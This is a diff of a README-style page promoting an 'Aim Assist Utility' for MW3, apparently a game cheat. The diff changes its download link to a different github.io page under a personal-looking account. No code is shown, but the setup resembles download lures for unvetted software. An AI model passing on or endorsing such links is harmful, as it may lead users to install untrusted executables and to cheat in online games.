@@ -3,7 +3,7 @@
 Take your precision to the next level in **MW3** with this advanced Aim Assist Utility for PC. Built to mimic console-like aiming behavior, it provides dynamic slowdown, target tracking enhancements, and customizable smoothing curves for your mouse or controller.
 
 ⬇️ **Download Aim Assist**  
-[![Download](https://img.shields.io/badge/Download-Aim_Assist_MW3-111111?style=for-the-badge&logo=call-of-duty&logoColor=white)](https://cod-modern-warfare-3-aim-assist.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Aim_Assist_MW3-111111?style=for-the-badge&logo=call-of-duty&logoColor=white)](https://helendavis50546167.github.io/.github/cod-modern-warfare-assist)
 
 ---
 
